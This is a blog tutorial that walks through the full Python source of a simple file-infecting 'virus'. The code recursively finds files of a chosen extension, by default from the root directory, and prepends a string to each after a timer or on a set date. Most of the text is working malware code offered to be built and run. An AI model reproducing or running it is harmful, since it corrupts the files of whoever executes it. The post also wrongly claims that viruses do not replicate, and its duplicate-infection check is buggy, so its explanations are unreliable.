---
layout: single
title: "Write a Simple Virus in Python"
header:
  image: "https://live.staticflickr.com/65535/51221326129_1df153df24_c.jpg"
  teaser: "https://live.staticflickr.com/65535/51221326129_1df153df24_c.jpg"
categories:
  - Security
tags:
  - Python
  - Tutorial
  - Virus
  - File Infection
toc: true
toc_label: "Table of Contents"
toc_icon: "heart"
---


Sometimes we find our files being infected with a `computer virus`. In this tutorial, we will get introduced to the concept of a virus by writing a simple one in Python.

First thing first, let's get introduced to the definition of a computer virus. A virus is a typical malware program that infects a particular type of file or most files by injecting data or code. It tries to list files in all directories and then inject typical data/code in those files.

Point to be noted; a virus does not replicate itself. It just continuously infects all files in the directories/folders. The malware that replicates itself and consumes hard disk space is typically called a `Worm`.

If you are interested to write other types of malwares, you can go through my previous posts:
* [Write a Backdoor in Python](https://shantoroy.com/security/simple-backdoor-using-python/)
* [Write a Worm (Malware) in Python](https://shantoroy.com/security/write-a-worm-malware-in-python/)
* [A Basic Keylogger in Python](https://shantoroy.com/security/a-simple-keylogger-in-python/)

Okay, now, let's get started writing one.

## Requirements
To write a simple virus, we will use the following modules.
```python
import os
import datetime
import pathlib
import time
```
### `os` module
Here, module `os` is the most important one as it will help us to list all the files along with the absolute path. An absolute path starts with the root directory `/`. For example, if my current working directory is `Downloads` and there is file named `hi.txt` inside a subfolder named `test_sub`. Then 
```
absolute path: /Users/roy/Downloads/test_sub/hi.txt
relative path: test_sub/hi.txt
```
Absolute path is necessary here as while working with numerous files you must know the exact location. Using filenames only, your script do not know where to look for that files.

### `pathlib` module
Here, we use `pathlib` to retrive the extension of a file. It can be done in multiple ways though, so you may not find this module necessary at all.

### `datetime` and `time`
`datetime` and `time` is used only for the start time of execution. If you want the script to start working right now, you may not need these modules as well. 


## Virus Class
### The initializer method
Now, lets create a virus class that accepts four arguments when it is called.

```python
class Virus:
    
    def __init__(self, infect_string=None, path=None, \
                         extension=None, target_file_list=None):
        if isinstance(infect_string, type(None)):
            self.infect_string = "I am a Virus"
        else:
            self.infect_string = infect_string
            
        if isinstance(path, type(None)):
            self.path = "/"
        else:
            self.path = path
            
        if isinstance(extension, type(None)):
            self.extension = ".py"
        else:
            self.extension = extension
            
        if isinstance(target_file_list, type(None)):
            self.target_file_list = []
        else:
            self.target_file_list = target_file_list
```

Here, the `infect_string` will be used to insert in a file. If the user does not provide an input, the default value is "I am a Virus". 

By default the `path` is set to be the root directory `/`. From here, it will browse all subdirectories and files. However, the user can provide a target path as well.

User can define target file `extension`. If not, the default is set to be python files `.py`.

User can also provide the `target_file_list` that conatains all the listed target files. If `None`, the constructor method set it as an empty list.

Btw, if you are wondering that why the code looks a bit ugly, you can use the following as well.

```python
class Virus:
    
    def __init__(self, infect_string="I am a Virus", path="/", \
                         extension=".py", target_file_list=[]):
            self.infect_string = infect_string
            self.path = path
            self.extension = extension
            self.target_file_list = target_file_list
```

I just prefer the earlier way to set all default values inside the constructor method. However, the latter is a lot easier to understand and use.

### Method to list all target files
here we use another mthod named `list_files` that lists all files within directories and subdirectories given an initial path.

```python
    def list_files(self, path):
        files_in_current_directory = os.listdir(path)
        
        for file in  files_in_current_directory:
            # avoid hidden files/directories (start with dot (.))
            if not file.startswith('.'):
                # get the full path
                absolute_path = os.path.join(path, file)
                # check the extension
                file_extension = pathlib.Path(absolute_path).suffix
				
				# check if it is a directory
                if os.path.isdir(absolute_path):
                    self.target_file_list.extend(self.list_files(absolute_path))
				
				# check if the target file extension matches
                elif file_extension == self.extension:
                    is_infected = False
                    with open(absolute_path) as f:
                        for line in f:
                            if self.infect_string in line:
                                self.is_infected = True
                                break
                    if is_infected == False:
                        self.target_file_list.append(absolute_path)
                else:
                    pass
```

here, in the method we did the followings:
1. list all files in the current working directory
2. iterate over all files and do the followings
	* only consider visible files (avoid hidden files, e.g., starts with dot `.` in Unix-based systems)
	* get the absolute path using `os.path.join`
	* retrieve the file extension using `pathlib.Path`
	* check if it is a directory using `os.path.isdir` (if yes, call the same function and pass the path to continue digging deeper, in coding world it is called a `**recursive function**`)
	* Check if the extension matches with target extension (if yes, check whether it is already infected by looking for the string in the file; if string not found, append to the list).  

### Method to infect the files
Here, we will add another method that can infect (insert/prepend) the string in the given filename.

```python
    def infect(self, file_abs_path):
        if os.path.basename(file_abs_path) != "virus.py":
            try:
                f = open(file_abs_path, 'r')
                data = f.read()
                f.close()
                virus = open(file_abs_path, 'w')
                virus.write(self.infect_string + "\n" + data )
                virus.close()
            except Exception as e:
                print(e)
        else:
            pass
```
To prepend the `self.infect_string`, we first read the whole file and keep the contents in a variable `data`;  then add our string before the data and write to the file.

point to be noted, in this example as we are using python files, we need to exclude our own file, right?  :zany_face:

that's why I exclude the filename there in the very first condition.

### Final method that integrates everything
Now, we can first define when to start our virus. 
* Do you want to set a timer (e.g., 60 seconds), then provide input to the `timer` while calling this method.
* Do you want to set a date (e.g., someone's birthday), then provide input to the `target_date` while calling this method.

And, then our primary mission begins. 
1. List all target files by calling the `list_files` method
2. For each file, insert the string using the `infect` method

okay, so, here is our code
```python
    def start_virus_infections(self, timer=None, target_date=None):
        if not isinstance(timer, type(None)):
            time.sleep(timer)
            self.list_files(self.path)
            for target in self.target_file_list:
                self.infect(target)
                
        elif not isinstance(target_date, type(None)):
            today = str(datetime.datetime.today())[:10]
            if str(target_date) == today:
                self.list_files(self.path)
                for target in self.target_file_list:
                    self.infect(target)
                    
        else:
            print("User must provide either a timer or a date using datetime.date()")
```

## Main Function
Now, let's create our main function and run the code

```python
if __name__ == "__main__":
    current_directory = os.path.abspath("")
    virus = Virus(path=current_directory)
    # virus.start_virus_infections(target_date=datetime.date(2021,6,1))
    virus.start_virus_infections(timer=5)
    # print(virus.target_file_list)
```

Here, we first create an object of the class. And then call the `start_virus_infections` method with providing a timer or a date. To avoid hassle, use `os.path.abspath("")`, which refers to the current directory only so that you do not get hurt with inserting the string in other necessary python codes you wrote before.

## Testing
To have a easier testing environment, create a few python files in the same directory and check if your virus is able to insert the string to those files. To make things easier, run the following code to create three python files (create a seperate script).

```python
if __name__ == '__main__':
    filenames = ["test1.py", "test2.py", "test3.py"]
    data = 'print("hello")\n'

    for file in filenames:
        f = open(file, "w")
        f.write(data)
        f.close()
```
Both codes are available in [**GitHub**](https://github.com/shantoroy/intro-2-cybersecurity-in-python/tree/master/virus).

that's all folks, you can look at other security concept tutorials in python. I have created a repository for that. I am planning to provide security concepts by writing python codes. Please feel free to put a star if you like the repository.

https://github.com/shantoroy/intro-2-cybersecurity-in-python

Also, the associated blog post links are available in the `ReadMe` file over there.

Have a good day! Cheers!!!

## References
1. [Viruses – From Newbie to pro](https://www.geeksforgeeks.org/viruses-from-newbie-to-pro/)
2. [os- Miscellaneous operating system interfaces](https://docs.python.org/3/library/os.html)
<!--stackedit_data:
eyJoaXN0b3J5IjpbMTU3MTk0OTQxMywyMDQyNzg0Nzk3LC02Nj
U1ODM3NjldfQ==
-->